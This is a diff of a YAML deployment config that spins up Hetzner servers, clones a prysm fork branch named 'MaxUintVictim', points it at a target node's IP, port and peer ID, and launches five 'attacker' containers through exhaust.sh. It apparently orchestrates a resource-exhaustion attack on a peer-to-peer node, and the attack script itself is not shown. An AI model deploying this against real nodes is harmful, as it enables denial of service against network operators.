@@ -1,39 +1,61 @@
 
 general:
   # Amount of servers to create
-  servers: 3
+  servers: 1
+  # Good choices are (depending on the power required): cx11, cx21, cx31, cx41
+  # More - https://www.hetzner.com/cloud
+  server_type: "cx11"
   # Hetzner.com token (https://docs.hetzner.cloud/#authentication)
   token: null
-  # Wait for servers' initialization
+  # Second to wait for servers' initialization
   wait: 30
   # Install mullvad vpn on the server (https://mullvad.net)
-  # Any account number contains of 16 digits as of February 2021
-  #mullvad:
-    #account: XXXXYYYYXXXXYYYY
+  # Any account number is a unique id containing 16 digits as of February 2021
+  # mullvad:
+  #   account: null
 
 commands:
   # Dependencies
-  - "apt-get update && apt-get upgrade -qq -y && apt-get install -qq -y docker.io golang git curl gnupg"
+  - command: "apt-get update && apt-get upgrade -qq -y && apt-get install -qq -y docker.io golang git curl gnupg g++ unzip zip libncurses5 libgmp-dev libssl-dev"
+  - "ls"  # some weird bug, second command is just eaten silently *sometimes* (?????)
   # Bazel install
-  - "curl -fsSL https://bazel.build/bazel-release.pub.gpg | gpg --dearmor > bazel.gpg"
-  - "mv bazel.gpg /etc/apt/trusted.gpg.d/"
-  - "echo 'deb [arch=amd64] https://storage.googleapis.com/bazel-apt stable jdk1.8' | tee /etc/apt/sources.list.d/bazel.list"
-  - "apt-get update && apt-get install -qq -y bazel"
+  - "mkdir -p /usr/local/lib/bazel/bin"
+  - "cd /usr/local/lib/bazel/bin && curl -fsSLO https://releases.bazel.build/3.7.0/release/bazel-3.7.0-linux-x86_64 && chmod +x bazel-3.7.0-linux-x86_64 && cd /root"
+  - "ln -s /usr/local/lib/bazel/bin/bazel-3.7.0-linux-x86_64 /usr/bin/bazel"
   # Clone the project
-  - command: "git clone https://{username}:{password}@github.com/org404/prysm.git"
+  - command: "git clone --depth 1 --branch \"MaxUintVictim\" https://{username}:{password}@github.com/org404/prysm.git"
     username: null
     password: null
   - "cd prysm"
+  # Set target
+  - command: "export TARGET=/ip4/{target_ip}/tcp/{target_port}/p2p/{target_addr}"
+    target_ip: null
+    target_port: null
+    target_addr: null
+  # Set amount of instances to spin up
+  - "export N=5"
+  - "chmod +x exhaust.sh"
+  - "./exhaust.sh"
   # Report message. "index" is a builtin var that any message has access to.
-  - command: "echo \"(ipv4='$(curl -s -4 ifconfig.io)', ipv6='$(curl -s -6 ifconfig.io)') finished deployement.\""
+  - command: "echo \"[Server #{index}] (ipv4='$(curl -s -4 ifconfig.io)', ipv6='$(curl -s -6 ifconfig.io)') finished deployement.\""
+    # Shows output
     show: True
 
 assertions:
-  # just for testing, we check if directory contains 'exhaust.sh'
-  - command: "ls"
+  # Sanity check, we look for 'exhaust.sh' in a cloned project
+  - command: "ls /root/prysm"
     contains: "exhaust.sh"
-  #  show: True  # Off by default
-  # check if attacker is running
-  # - command: "docker ps"
-  #   contains: "attacker"
+    # show: True  # Off by default
+  # Check if attackers are running
+  - command: "docker ps"
+    # [DEBUG] show: True
+    contains: "attacker-1"
+  - command: "docker ps"
+    contains: "attacker-2"
+  - command: "docker ps"
+    contains: "attacker-3"
+  - command: "docker ps"
+    contains: "attacker-4"
+  - command: "docker ps"
+    contains: "attacker-5"
 
